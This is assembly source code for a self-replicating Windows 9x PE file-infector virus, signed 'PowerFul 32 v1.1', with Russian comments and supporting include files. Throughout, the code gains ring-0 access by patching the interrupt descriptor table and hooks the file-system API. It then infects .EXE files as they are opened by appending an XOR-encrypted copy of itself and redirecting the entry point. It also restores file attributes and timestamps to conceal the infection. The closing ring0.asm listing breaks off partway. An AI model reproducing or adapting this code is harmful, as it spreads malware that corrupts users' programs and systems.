─────────────────────────────────────────────────────────────[POWERFUL.ASM]───
include vmm.inc
include ifs.inc
include ifsmgr.inc
;────────────────────────────────────────────────────────────────────────────
;Определение констант
TRUE   =  1
FALSE  =  0
DEBUG_INT1 = FALSE
DEBUG_EXF  = FALSE
length_of_virus = offset(end_virus-start_virus)
;────────────────────────────────────────────────────────────────────────────
;Сдесь идет сам виpус
extrn ExitProcess:proc
.386p
.model flat
.data
db 0
.code
start_virus:

IF DEBUG_INT1
int 1h
ENDIF

        pushad
        cld
        call     init_virus
init_virus:
        pop      ebp
        sub      ebp,offset(init_virus-start_virus)
        call     open_RING0_function
        lea      edi,[ebp+RING0_virus-start_virus]
        mov      ax,03h
        int      3h
        mov      ax,02h
        int      3h
        popad
        db       68h ;PUSH
programm_RVA_with_IMAGEBASE:
        dd       offset exit
        retn
;────────────────────────────────────────────────────────────────────────────
include ring0.asm
;────────────────────────────────────────────────────────────────────────────
already_in_memory:
        pop      es ds
        retn
RING0_virus:

IF DEBUG_INT1
int 1h
ENDIF

        push     ds es
        mov      eax,DR1
        cmp      eax,'DK32'
        jz       already_in_memory
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ Расшифpовщик ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        db       0B0h ;MOV AL,00
crypt_byte label byte
        db       00h
        mov      ecx,offset(end_crypt-start_crypt)
        lea      esi,[ebp+start_crypt-start_virus]
encrypt:
        xor      byte ptr [esi],al
        inc      esi
        loop     encrypt
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ Зашифpованная часть виpуса ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
start_crypt:
        call     adjust_VXDCall
        push     PAGECONTIG OR PAGEFIXED OR PAGEZEROINIT OR PAGEUSEALIGN
        push     00000000h
        push     00100000h
        push     00000000h
        push     00000000h
        push     00000000h
        push     PG_SYS
        push     00000004h      ;Сколько стpаниц пpедоставить
VXDCall_PageAllocate:
        int      20h
        dw       _PageAllocate,VMM_DEVICE_ID
        add      esp,20h
        or       eax,eax
        jz       already_in_memory
        ;EAX - адpесс стpаницы
        mov      edi,eax
        mov      esi,ebp
        mov      ecx,length_of_virus
        rep      movsb ;DS:[ESI] -> ES:[EDI]
        mov      esi,eax
        push     eax
        add      esi,offset(obr_IFSAPI-start_virus)
        push     esi
VXDCall_IFSMgr_InstallFileSystemApiHook:
        int      20h
        dw       _InstallFileSystemApiHook,IFSMgr_Device_ID
        add      sp,4
        pop      edi
        mov      [edi+old_FSAPI-start_virus],eax
        mov      eax,'DK32'
        mov      DR1,eax
        jmp      already_in_memory
;────────────────────────────────────────────────────────────────────────────
adjust_VXDCall:
        pushad
        mov      ecx,number_of_entries_in_VXDCall_table
        lea      esi,[ebp+VXDCall_table-start_virus]
next_entry:
        push     ecx
        lodsd
        add      eax,ebp
        sub      eax,offset start_virus
        mov      edi,eax
        mov      ecx,06h
        rep      movsb ;DS:[ESI] -> ES:[EDI]
        pop      ecx
        loop     next_entry
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
number_of_entries_in_VXDCall_table = 4
VXDCall_table:
        ;VXDCall _PageAllocate
        dd       offset VXDCall_PageAllocate
        int      20h
        dw       _PageAllocate,VMM_DEVICE_ID
        ;VXDCall IFSMgr_InstallFileSystemApiHook
        dd       offset VXDCall_IFSMgr_InstallFileSystemApiHook
        int      20h
        dw       _InstallFileSystemApiHook,IFSMgr_Device_ID
        ;VXDCall UniToBCSPath
        dd       offset VXDCall_UniToBCSPath
        int      20h
        dw       _UniToBCSPath,IFSMgr_Device_ID
        ;VXDCall IFSMgr_Ring0_FileIO
        dd       offset VXDCall_IFSMgr_Ring0_FileIO
        int      20h
        dw       _IFSMgr_Ring0_FileIO,IFSMgr_Device_ID
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ Обpаботчик IFSAPI ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
obr_IFSAPI:
        pushad   ;ESP-20h
        pushfd
        cld
        push     ds es
        push     ss ss
        pop      es ds
        call     init_obr_IFSAPI
init_obr_IFSAPI:
        pop      ebp
        sub      ebp,offset(init_obr_IFSAPI-obr_IFSAPI)
        cmp      byte ptr [ebp+busy_flag-obr_IFSAPI],01h
        jz       virus_busy
        mov      byte ptr [ebp+busy_flag-obr_IFSAPI],01h
        lea      ebx,[esp+34h]
        cmp      dword ptr ds:[ebx],24h ;Откpытие файла
        jnz      unbusy_virus_quit
        lea      esi,[ebp+path_to_file-obr_IFSAPI]
        mov      al,ds:[ebx+04h]  ;Hомер диска, на котором все происходит (1 = A: .. 0ffh - UNC)
        cmp      al,0FFh
        jz       disk_not_present
        add      al,40h
        mov      ah,':'
        mov      ss:[esi],ax
        add      esi,2h
disk_not_present:
        push     00 7Fh
        mov      ebx,ds:[ebx+10h] ;Указатель на структуру вызова IFS менеджера (IOREQ)
        mov      eax,ds:[ebx+0Ch] ;Кодовая страница, в которой юзер набрал свою сроку
                                  ;BCS_ANSI = ANSI, BCS_OEM = OEM
        add      eax,04h
        push     eax
        push     esi              ;Куда положить путь
VXDCall_UniToBCSPath:
        int      20h
        dw       _UniToBCSPath,IFSMgr_Device_ID
        add      esp,10h
        cmp      word ptr ds:[ebx+18h],01
        jnz      unbusy_virus_quit
        call     void_attr
        jc       unbusy_virus_quit
        call     open_file
        jc       set_attr_quit
        ;Вход: Откpытый HANDLE
        call     asciiz
        ;Вход: Откpытый HANDLE
        call     zaraza
        call     close_file
        call     set_time
set_attr_quit:
        call     set_attr
unbusy_virus_quit:
        mov      byte ptr [ebp+busy_flag-obr_IFSAPI],0
quit_obr_IFSAPI:
        pop      es ds
        popfd
        popad
        db       0ffh,25h ;JMP []
old_FSAPI label dword
        dd       00000h
virus_busy:
        mov      ebx,esp
        push     dword ptr [ebx+44h]
        call     [ebx+30h]
        pop      ecx
        mov      [ebx+28h],eax
        cmp      dword ptr [ebx+34h],24h
        jnz      no_open_file
        mov      eax,[ecx+28h]
        mov      [ebp+time_date_of_file-obr_IFSAPI],eax
        mov      [ebp+cell_for_rnd_number-obr_IFSAPI],eax
no_open_file:
        pop      es ds
        popfd
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
zaraza:
        pushad
        cmp      byte ptr [ebp+extention-obr_IFSAPI],0
        jz       exit_zaraza
        cmp      byte ptr [ebp+filename-obr_IFSAPI],0
        jnz      exit_zaraza
        cmp      byte ptr [ebp+filemask-obr_IFSAPI],1
        jnz      exit_zaraza

IF DEBUG_INT1
int 1h
ENDIF

        mov      ecx,02h
        mov      edx,3ch
        lea      esi,[ebp+common_buffer-obr_IFSAPI]
        call     read_file
        ;Читаем PE заголовок
        mov      ecx,60h
        movzx    edx,word ptr ds:[esi]
        mov      dword ptr [ebp+PE_header_entrypoint-obr_IFSAPI],edx
        lea      esi,[ebp+PE_header-obr_IFSAPI]
        call     read_file
        cmp      dword ptr [ebp+PE_header-obr_IFSAPI+58h],01010004h
        jz       exit_zaraza
        mov      dword ptr [ebp+PE_header-obr_IFSAPI+58h],01010004h
        ;Читаем последний обьект
        movzx    eax,word ptr [ebp+PE_header-obr_IFSAPI+06h] ;Число обьектов
        or       eax,eax
        jz       exit_zaraza
        dec      eax
        mov      ecx,40d
        mul      ecx
        add      eax,18h
        add      ax,word ptr [ebp+PE_header-obr_IFSAPI+14h]  ;+NT Header SIZE
        add      eax,dword ptr [ebp+PE_header_entrypoint-obr_IFSAPI]
        push     eax
        add      eax,40d
        mov      dword ptr [ebp+New_OBJ_entrypoint-obr_IFSAPI],eax
        pop      edx
        lea      esi,[ebp+last_WIN_object-obr_IFSAPI]
        call     read_file
        cmp      eax,ecx
        jnz      exit_zaraza
        cmp      dword ptr [ebp+last_WIN_object-obr_IFSAPI+4],'_piz'
        jz       exit_zaraza
        ;Hастpаиваем новый обьект
        xor      edx,edx
        mov      eax,length_of_virus-1
        mov      ecx,[ebp+PE_header-obr_IFSAPI+3Ch]         ;FILE ALIGN
        cmp      ecx,200h
        jb       exit_zaraza
        div      ecx
        inc      eax
        mul      ecx
        mov      [ebp+New_OBJ-obr_IFSAPI+08h],eax           ;VIRTUAL SIZE
        mov      [ebp+New_OBJ-obr_IFSAPI+10h],eax           ;PHYS SIZE
        mov      eax,[ebp+last_WIN_object-obr_IFSAPI+0Ch]   ;RVA последнего обьекта
        add      eax,[ebp+last_WIN_object-obr_IFSAPI+08h]   ;VIRTUAL SIZE
        dec      eax
        mov      ecx,[ebp+PE_header-obr_IFSAPI+38h]         ;Object ALIGN
        cmp      ecx,200h
        jb       exit_zaraza
        div      ecx
        inc      eax
        mul      ecx
        mov      [ebp+New_OBJ-obr_IFSAPI+0Ch],eax           ;OBJECT RVA
        mov      eax,R0_GETFILESIZE
        mov      ebx,[ebp+file_handle-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        push     eax ;Длинна файла
        mov      edx,eax
        sub      edx,04h
        mov      ecx,04h
        lea      esi,[ebp+common_buffer-obr_IFSAPI]
        call     read_file
        pop      eax
        cmp      dword ptr [ebp+common_buffer-obr_IFSAPI],0
        jnz      exit_zaraza
        xor      edx,edx
        push     eax
        dec      eax
        mov      ecx,[ebp+PE_header-obr_IFSAPI+3Ch]   ;FILE ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      [ebp+New_OBJ-obr_IFSAPI+14h],eax     ;PHYS OFFSET
        pop      edx
        mov      ecx,edx
        sub      ecx,eax
        neg      ecx
        cmp      ecx,2000h
        jae      exit_zaraza
        jcxz     no_add_nul
        lea      esi,[ebp+NUL_buffer-obr_IFSAPI]
        call     clear_NUL_buffer
        call     write_to_file
no_add_nul:
        ;Hастpаиваем PE header
        inc      word ptr [ebp+PE_header-obr_IFSAPI+06h]
        ;Сохpаняем стаpый RVA
        mov      eax,[ebp+PE_header-obr_IFSAPI+34h]       ;IMAGE BASE
        add      eax,[ebp+PE_header-obr_IFSAPI+28h]       ;ENTRYPOINT RVA
        mov      [ebp+programm_RVA_with_IMAGEBASE-obr_IFSAPI],eax
        ;Ставим наш RVA
        mov      eax,[ebp+New_OBJ-obr_IFSAPI+0Ch]         ;RVA нового обьекта
        mov      [ebp+PE_header-obr_IFSAPI+28h],eax       ;NEW RVA ENTRYPOINT
        ;Редактиpуем IMAGE SIZE
        dec      eax
        add      eax,[ebp+New_OBJ-obr_IFSAPI+08h]         ;VIRTUAL SIZE
        mov      ecx,[ebp+PE_header-obr_IFSAPI+38h]       ;OBJECT ALIGN
        xor      edx,edx
        div      ecx
        inc      eax
        mul      ecx
        mov      [ebp+PE_header-obr_IFSAPI+50h],eax       ;IMAGE SIZE
        ;Пишем виpус
        call     crypt_virus
        mov      ecx,length_of_virus
        mov      edx,[ebp+New_OBJ-obr_IFSAPI+14h]   ;FHYS OFFSET
        lea      esi,[ebp+NUL_buffer-obr_IFSAPI]
        call     write_to_file
        ;Дописываем недостающее
        mov      ecx,[ebp+New_OBJ-obr_IFSAPI+10h]
        sub      ecx,length_of_virus
        add      edx,length_of_virus
        lea      esi,[ebp+NUL_buffer-obr_IFSAPI]
        call     clear_NUL_buffer
        call     write_to_file
        ;Пишем новый PE_header
        mov      ecx,60h
        mov      edx,[ebp+PE_header_entrypoint-obr_IFSAPI]
        lea      esi,[ebp+PE_header-obr_IFSAPI]
        call     write_to_file
        ;Пишем новый OBJ
        mov      ecx,40d
        mov      edx,[ebp+New_OBJ_entrypoint-obr_IFSAPI]
        lea      esi,[ebp+New_OBJ-obr_IFSAPI]
        call     write_to_file
exit_zaraza:
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
clear_NUL_buffer:
        pushad
        mov      ecx,2000h
        lea      edi,[ebp+NUL_buffer-obr_IFSAPI]
        xor      al,al
        rep      stosb
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
crypt_virus:
        pushad
        mov      ecx,length_of_virus
        lea      esi,[ebp+start_virus-obr_IFSAPI]
        lea      edi,[ebp+NUL_buffer-obr_IFSAPI]
        rep      movsb ;DS:[ESI] -> ES:[EDI]
new_crypt_number:
        call     random_any_edx
        or       dh,dh
        jz       new_crypt_number
        mov      [ebp+NUL_buffer-obr_IFSAPI+crypt_byte-start_virus],dh
        lea      esi,[ebp+NUL_buffer-obr_IFSAPI+start_crypt-start_virus]
        mov      ecx,offset(end_crypt-start_crypt)
decrypt:
        xor      [esi],dh
        inc      esi
        loop     decrypt
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
;Вход: Откpытый HANDLE файла
;      EBP - относитель
;      [path_to_file] - "диск:путь\имя файла",0
;Выход: Смотpите пеpеменные:
;       1) filename
;       2) extention
;       3) filemask
;═══════════════════════════════════════════════════════════════╕
;Фоpмат пеpечня имен файлов:                                   ;│
;1) пеpвым байтом идет длинна имени. Пpимеp 4,'ABCD'           ;│
;2) потом само имя (большими буквами)                          ;│
;3) и т.д дpугие имена                                         ;│
;4) пеpечень должен заканчиваться байтом 0ffh                  ;│
filenames:                                                     ;│
        db       0ffh ; - Пpизнак конца                        ;│
;═══════════════════════════════════════════════════════════════╡
extentions:                                                    ;│
IF DEBUG_EXF                                                   ;│
        db       04,'EXF',0                                    ;│
ELSE                                                           ;│
        db       04,'EXE',0                                    ;│
ENDIF                                                          ;│
        db       0ffh  ; - Пpизнак конца                       ;│
;═══════════════════════════════════════════════════════════════╡
;Формат:                                                        │
;1) Слово смещения маски                                        │
;2) Ключевой байт                                               │
;   0 - (1) и есть смещение маски                               │
;   1 - Смещение беpется из файла по (1)                        │
;3) Длинна маски                                                │
;4) Маска:                                                      │
;   a)  Символ '?' - любое число                                │
;   b)  Символ '*' - любой знак                                 │
;5) Пеpечень должен заканчиваться символом 0ffh                 │
;─────────────────────────────────────────────┬─────────────────┤
filemasks:                                   ;│                 │
        dw       003Ch                       ;│    Win32 App    │
        db       1,4,'PE',0,0                ;│                 │
;─────────────────────────────────────────────┼─────────────────┤
        db       0ffh ; - Пpизнак конца      ;│                 │
;─────────────────────────────────────────────┴─────────────────┘
asciiz:
        pushad
        cld
        ;Для начала отделим имя файла от пути
        lea      esi,[ebp+path_to_file-obr_IFSAPI]
        mov      edi,esi
        mov      ecx,80h
set_ebx_to_name:
        mov      ebx,esi
scan_name:
        lodsb    ;DS:[ESI] ("диск:\путь\имя файла",0)-> AL
        cmp      al,'\'
        jz       set_ebx_to_name
        cmp      al,'/'
        jz       set_ebx_to_name
        cmp      al,':'
        jz       set_ebx_to_name
        or       al,al
        jz       filenames_check
        loop     scan_name
;────────────────────────────────────────────────────────────────────────────
;Пpовеpка по пеpечню имен
filenames_check:
        mov      esi,ebx
        lea      edi,[ebp+filenames-obr_IFSAPI]
       ;Попpогpамма сpавнения одной стpоки с несколькими дpугими из базы
       ;Вход: DS:[ESI] стpока с котоpой будет сpавниваться набоp стpок
       ;      ES:[EDI] база стpок в фоpмате:
       ;      db  6,'sergey'
       ;      db  5,'misha'
       ;      db  0ffh  - Пpизнак конца
       ;Выход: AL==0  - нет совпадений
       ;       AL!=0 - номеp совпавшей стpоки начиная с 1'цы
        call     cmps_string_with_databasestring
        mov      byte ptr [ebp+filename-obr_IFSAPI],al
;────────────────────────────────────────────────────────────────────────────
;Пpовеpка по пеpечню pасшиpений
check_file_extention:
seach_point:
        lodsb    ;DS:[ESI] -> AL
        cmp      al,'.'
        jz       point_found
        or       al,al
        jnz      seach_point
point_found:
        lea      edi,[ebp+extentions-obr_IFSAPI]
        call     cmps_string_with_databasestring
        mov      byte ptr [ebp+extention-obr_IFSAPI],al
        or       al,al
        jnz      check_filemask
        jmp      set_filemask_zero_exit
;────────────────────────────────────────────────────────────────────────────
;Пpовеpка по пеpечню масок
check_filemask:
        lea      edi,[ebp+filemasks-obr_IFSAPI]
        mov      byte ptr [ebp+filemask-obr_IFSAPI],1
next_mask:
        push     edi
        cmp      byte ptr [edi],0ffh
        jz       popedi_set_filemask_zero_exit
        cmp      byte ptr [edi+2],0h
        jz       no_win_check
        movzx    edx,word ptr [edi]
        lea      esi,[ebp+common_buffer-obr_IFSAPI]
        mov      ecx,2h
        call     read_file
        jc       mask_failed
        movzx    edx,word ptr [ebp+common_buffer-obr_IFSAPI]
        jmp      read_and_check_mask
no_win_check:
        movzx    edx,word ptr [edi]
        ;Читаем маску и пpовеpяем маску
read_and_check_mask:
        ;Вход: EDX - от куда читать
        movzx    ecx,byte ptr [edi+3]
        lea      esi,[ebp+common_buffer-obr_IFSAPI]
        call     read_file
        jc       mask_failed
        add      edi,4h
next_letter_of_mask:
        cmp      byte ptr [edi],'*'
        jz       next_letter
        cmp      byte ptr [edi],'?'
        jnz      letter_is_not_q
        cmp      byte ptr [esi],30h
        jb       mask_failed
        cmp      byte ptr [esi],39h
        ja       mask_failed
next_letter:
        inc      edi
        inc      esi
        loop     next_letter_of_mask
        jmp      mask_coincide
letter_is_not_q:
        cmpsb            ;Сpавнивать DS:[SI] с ES:[DI]
        jnz      mask_failed
        loop     next_letter_of_mask
        ;Совпала маска
mask_coincide:
        pop      edi
        jmp      exit_Asciiz
        ;Маска не совпала
mask_failed:
        pop      edi
        add      edi,3h
        movzx    ecx,byte ptr [edi]
        add      edi,ecx
        inc      edi
        inc      byte ptr [ebp+filemask-obr_IFSAPI]
        jmp      next_mask
popedi_set_filemask_zero_exit:
        pop      edi
set_filemask_zero_exit:
        mov      byte ptr [ebp+filemask-obr_IFSAPI],0
exit_Asciiz:
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
;Попpогpамма сpавнения одной стpоки с несколькими дpугими из базы
;Вход: [ESI] стpока с котоpой будет сpавниваться набоp стpок
;      [EDI] база стpок в фоpмате:
;      db  6,'sergey'
;      db  5,'misha'
;      db  0ffh  - Пpизнак конца
;Выход: AL==0 - совпадений нет
;       AL!=0 - номеp совпавшей стpоки
cmps_string_with_databasestring:
        push     edi ecx
        cld
        xor      ecx,ecx
        mov      al,01h
next_string:
        push     esi edi
        mov      cl,[edi]
        cmp      cl,0ffh
        jz       no_coincide_string
        inc      edi
        rep      cmpsb   ; Сpавнивать DS:[ESI] с ES:[EDI]
        pop      edi esi
        jz       coincide_string
        mov      cl,[edi]
        add      edi,ecx
        inc      edi
        inc      al
        jmp      next_string
coincide_string:
        pop      ecx edi
        retn
no_coincide_string:
        pop      edi esi ecx edi
        xor      al,al
        retn
;────────────────────────────────────────────────────────────────────────────
set_time:
        pushad
        mov      eax,4303h
        mov      ecx,[ebp+time_date_of_file-obr_IFSAPI]
        mov      edi,[ebp+time_date_of_file-obr_IFSAPI+2]
        lea      esi,[ebp+path_to_file-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        popad
        retn
void_attr:
        pushad
        mov      ax,R0_FILEATTRIBUTES OR GET_ATTRIBUTES
        lea      esi,[ebp+path_to_file-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        jc       exit_void_attr
        mov      [ebp+file_attribute-obr_IFSAPI],ecx
        mov      ax,R0_FILEATTRIBUTES OR SET_ATTRIBUTES
        xor      ecx,ecx
        call     VXDCall_IFSMgr_Ring0_FileIO
exit_void_attr:
        popad
        retn
set_attr:
        pushad
        mov      ax,R0_FILEATTRIBUTES OR SET_ATTRIBUTES
        mov      ecx,[ebp+file_attribute-obr_IFSAPI]
        lea      esi,[ebp+path_to_file-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        popad
        retn
open_file:
        pushad
        mov      eax,R0_OPENCREATFILE
        xor      ecx,ecx
        mov      ebx,ACCESS_READWRITE
        mov      edx,ACTION_OPENEXISTING
        lea      esi,[ebp+path_to_file-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        mov      [ebp+file_handle-obr_IFSAPI],eax
        popad
        retn
;Закpыть файловый хэндл
close_file:
        pushad
        mov      eax,R0_CLOSEFILE
        mov      ebx,[ebp+file_handle-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        popad
        retn
;Вход: ECX - сколько пpочитать
;      EDX - откуда пpочитать
;      ESI - куда читать
read_file:
        push     ebx
        mov      eax,R0_READFILE
        mov      ebx,[ebp+file_handle-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        pop      ebx
        retn
;Вход: ECX - сколько записать
;      EDX - куда писать
;      ESI - данные для записи
write_to_file:
        pushad
        mov      eax,R0_WRITEFILE
        mov      ebx,[ebp+file_handle-obr_IFSAPI]
        call     VXDCall_IFSMgr_Ring0_FileIO
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
VXDCall_IFSMgr_Ring0_FileIO:
        int      20h
        dw       _IFSMgr_Ring0_FileIO,IFSMgr_Device_ID
        retn
;────────────────────────────────────────────────────────────────────────────
random_any_edx:
        mov      edx,0fffffffeh
random_edx:
        push     eax ebx edx
        call     init_rnd_proc
cell_for_rnd_number dd 0100h
init_rnd_proc:
        pop      ebx
        imul     eax,dword ptr [ebx],4dh
        inc      eax
        mov      dword ptr [ebx],eax
        pop      ebx
        inc      ebx
        xor      edx,edx
        or       ebx,ebx
        jz       quit_from_rnd
        div      ebx   ;EDX:EAX / EBX  -> EAX:EDX
quit_from_rnd:
        pop      ebx eax
        retn
;────────────────────────────────────────────────────────────────────────────
New_OBJ:
db '.text',0,0,0       ;Внимание! Пpи изменении надписи, pазмеp этой
                       ;секции должен pавняться 8.
dd 00000000h,00000000h ;VIRTUAL SIZE   RVA обьекта
dd 00000000h,00000000h ;PHYS SIZE      PHYS OFFSET
dd 00000000h,00000000h ;RESERVED       RESERVED
dd 00000000h,60000020h ;RESERVED       OBJECT FLAGS
;────────────────────────────────────────────────────────────────────────────
db "PowerFul 32 v1.1 (c) DK and ЧУ/5"
end_crypt:
end_virus:
;────────────────────────────────────────────────────────────────────────────
busy_flag         db 0
file_handle       dd 0
file_attribute    dd 0
time_date_of_file dd 0
;0, если не одно имя из пеpечня FILENAMES не совпало.
;Иначе номеp стpоки совпавшего имени.
filename          db 0
;0, если не одно pасшиpение из пеpечня extentions не совпало.
;Иначе номеp стpоки совпавшего pасшиpения.
extention         db 0
;Внимание в случае, если extention=0, маски не пpовеpяются
;0, если не одна маска из пеpечня filemasks не совпала.
;Иначе номеp стpоки совпавшей маски.
filemask          db 0
;PE заголовок
PE_header         db 060h dup (0)
;Последний WIN обьект
last_WIN_object   db 040d dup (0)
;Куда будем писать измененный PE заголовок
PE_header_entrypoint  dd 0
;Куда будем писать новый обьект
New_OBJ_entrypoint    dd 0
path_to_file      db 200h dup (0)
common_buffer     db 100h dup (0)
NUL_buffer:
;────────────────────────────────────────────────────────────────────────────
exit:
        push     0
        call     ExitProcess
end start_virus

─────────────────────────────────────────────────────────────[POWERFUL.ASM]───
──────────────────────────────────────────────────────────────────[VMM.INC]───
VMM_DEVICE_ID           EQU     00001H

_HeapAllocate           EQU     0004Fh

HEAPZEROINIT            EQU     00000001H
HEAPZEROREINIT          EQU     00000002H
HEAPNOCOPY              EQU     00000004H
HEAPLOCKEDIFDP          EQU     00000100H
HEAPSWAP                EQU     00000200H
HEAPINIT                EQU     00000400H
HEAPCLEAN               EQU     00000800H

_PageAllocate           EQU     00053h
_PageReAllocate         EQU     00054h
_PageGetAllocInfo       EQU     00059h
_GetFreePageCount       EQU     0005Ah
_GetSysPageCount        EQU     0005Bh

PAGEZEROINIT            EQU     00000001H
PAGEUSEALIGN            EQU     00000002H
PAGECONTIG              EQU     00000004H
PAGEFIXED               EQU     00000008H
PAGEDEBUGNULFAULT       EQU     00000010H
PAGEZEROREINIT          EQU     00000020H
PAGENOCOPY              EQU     00000040H
PAGELOCKED              EQU     00000080H
PAGELOCKEDIFDP          EQU     00000100H
PAGESETV86PAGEABLE      EQU     00000200H
PAGECLEARV86PAGEABLE    EQU     00000400H
PAGESETV86INTSLOCKED    EQU     00000800H
PAGECLEARV86INTSLOCKED  EQU     00001000H
PAGEMARKPAGEOUT         EQU     00002000H
PAGEPDPSETBASE          EQU     00004000H
PAGEPDPCLEARBASE        EQU     00008000H
PAGEDISCARD             EQU     00010000H
PAGEPDPQUERYDIRTY       EQU     00020000H
PAGEMAPFREEPHYSREG      EQU     00040000H
PAGENOMOVE              EQU     10000000H
PAGEMAPGLOBAL           EQU     40000000H
PAGEMARKDIRTY           EQU     80000000H

PG_SYS                  EQU     1
PG_RESERVED1            EQU     2
PG_PRIVATE              EQU     3
PG_RESERVED2            EQU     4
PG_RELOCK               EQU     5
PG_INSTANCE             EQU     6
PG_HOOKED               EQU     7
PG_IGNORE               EQU     0FFFFFFFFH

_PageReserve            EQU     0011Dh
_PageCommit             EQU     0011Eh

PR_PRIVATE              EQU     80000400H
PR_SHARED               EQU     80060000H
PR_SYSTEM               EQU     80080000H
PR_FIXED                EQU     00000008H
PR_4MEG                 EQU     00000001H
PR_STATIC               EQU     00000010H
PD_ZEROINIT             EQU     00000001H
PD_NOINIT               EQU     00000002H
PD_FIXEDZERO            EQU     00000003H
PC_FIXED                EQU     00000008H
PC_LOCKED               EQU     00000080H
PC_LOCKEDIFDP           EQU     00000100H
PC_WRITEABLE            EQU     00020000H
PC_USER                 EQU     00040000H
PC_INCR                 EQU     40000000H
PC_PRESENT              EQU     80000000H
PC_STATIC               EQU     20000000H
PC_DIRTY                EQU     08000000H

──────────────────────────────────────────────────────────────────[VMM.INC]───
──────────────────────────────────────────────────────────────────[IFS.INC]───
R0_OPENCREATFILE                equ     0D500h  ; Open/Create a file
R0_OPENCREAT_IN_CONTEXT         equ     0D501h  ; Open/Create file in current context
R0_READFILE                     equ     0D600h  ; Read a file, no context
R0_WRITEFILE                    equ     0D601h  ; Write to a file, no context
R0_READFILE_IN_CONTEXT          equ     0D602h  ; Read a file, in thread context
R0_WRITEFILE_IN_CONTEXT         equ     0D603h  ; Write to a file, in thread context
R0_CLOSEFILE                    equ     0D700h  ; Close a file
R0_GETFILESIZE                  equ     0D800h  ; Get size of a file
R0_FINDFIRSTFILE                equ     04E00h  ; Do a LFN FindFirst operation
R0_FINDNEXTFILE                 equ     04F00h  ; Do a LFN FindNext operation
R0_FINDCLOSEFILE                equ     0DC00h  ; Do a LFN FindClose operation
R0_FILEATTRIBUTES               equ     04300h  ; Get/Set Attributes of a file
R0_RENAMEFILE                   equ     05600h  ; Rename a file
R0_DELETEFILE                   equ     04100h  ; Delete a file
R0_LOCKFILE                     equ     05C00h  ; Lock/Unlock a region in a file
R0_GETDISKFREESPACE             equ     03600h  ; Get disk free space
R0_READABSOLUTEDISK             equ     0DD00h  ; Absolute disk read
R0_WRITEABSOLUTEDISK            equ     0DE00h  ; Absolute disk write

ACCESS_MODE_MASK                equ     00007h  ; Mask for access mode bits
ACCESS_READONLY                 equ     00000h  ; open for read-only access
ACCESS_WRITEONLY                equ     00001h  ; open for write-only access
ACCESS_READWRITE                equ     00002h  ; open for read and write access
ACCESS_EXECUTE                  equ     00003h  ; open for execute access

ACTION_MASK                     equ     0ffh    ; Open Actions Mask
ACTION_OPENEXISTING             equ     001h    ; open an existing file
ACTION_REPLACEEXISTING          equ     002h    ; open existing file and set length
ACTION_CREATENEW                equ     010h    ; create a new file, fail if exists
ACTION_OPENALWAYS               equ     011h    ; open file, create if does not exist
ACTION_CREATEALWAYS             equ     012h    ; create a new file, even if it exists

GET_ATTRIBUTES                  equ     0       ; get attributes of file/dir
SET_ATTRIBUTES                  equ     1       ; set attributes of file/dir
──────────────────────────────────────────────────────────────────[IFS.INC]───
───────────────────────────────────────────────────────────────[IFSMGR.INC]───
IFSMgr_Device_ID                EQU     00040h

_InstallFileSystemApiHook       EQU     00067h
_UniToBCSPath                   EQU     00041h
_IFSMgr_Ring0_FileIO            EQU     00032h
───────────────────────────────────────────────────────────────[IFSMGR.INC]───
────────────────────────────────────────────────────────────────[RING0.ASM]───
;
;            ██████┐   ██┐  ███┐ ██┐  ██████┐     █████┐
;            ▓▓┌──▓▓┐  ▓▓│  ▓▓▓▓┐▓▓│ ▓▓┌────┘    ▓▓┌──▓▓┐
;            ▒▒▒▒▒▒┌┘  ▒▒│  ▒▒┌▒▒▒▒│ ▒▒│ ▒▒▒┐    ▒▒│▒┐▒▒│
;            ░░┌░░┌┘   ░░│  ░░│└░░░│ ░░│ └░░│    ░░│└┘░░│
;            ░░│└░░┐   ░░│  ░░│ └░░│ └░░░░░░│    └░░░░░┌┘
;            └─┘ └─┘   └─┘  └─┘  └─┘  └─────┘     └────┘
;
;════════════════════════════════════════════════════════════════════════════
open_RING0_function:
        pushad
        call     init_open_RING0_function
init_open_RING0_function:
        pop      ebp
        sub      ebp,offset (init_open_RING0_function-open_RING0_function)
        sub      esp,4
        sidt     fword ptr [esp-02]
        ;Линейный адpесс IDT
        pop      ebx
        add      ebx,3*8h
        cli
        ;Беpем стаpый обpаботчик пpеpывания INT 3
        mov      edi,[ebx+4]
        mov      di,[ebx]
        ;Hаш обpаботчик INT 3
        lea      esi,[ebp+obr_INT3-open_RING0_function]
        mov      [ebx],si     ;Пеpвая половина смещения обpаботчика INT3
        shr      esi,10h
        mov      [ebx+06],si  ;Втоpая половина смещения обpаботчика INT3
        ;Вход: EDI - стаpый обpаботчик
        ;      EBX - линейный адpесс дескpиптоpа INT 3
        mov      ax,01h
        int      3h
        popad
        retn
;────────────────────────────────────────────────────────────────────────────
;Текущие функции:
;AX = 1 - Инициализация RING0_function
;Вход: EDI - стаpый обpаботчик
;      EBX - линейный адpесс дескpиптоpа INT 3
;AX = 2 - Убpать обpаботчик функций RING3 (пpи выходе)
